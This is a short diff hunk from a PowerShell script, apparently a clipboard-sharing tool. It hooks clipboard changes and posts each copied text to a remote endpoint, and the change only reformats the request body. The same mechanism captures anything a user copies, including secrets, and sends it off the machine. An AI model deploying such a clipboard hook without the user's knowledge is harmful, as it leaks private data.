@@ -201,7 +201,7 @@ Register-ClipboardTextChangedEvent -Action `
  
         Invoke-RestMethod -Method 'Post' `
             -Uri $ShowChunkEndpoint `
-            -Body "params=$($body | ConvertTo-Json)"
+            -Body "$($body | ConvertTo-Json)"
         Write-Host "Sent: $text"
     }
 
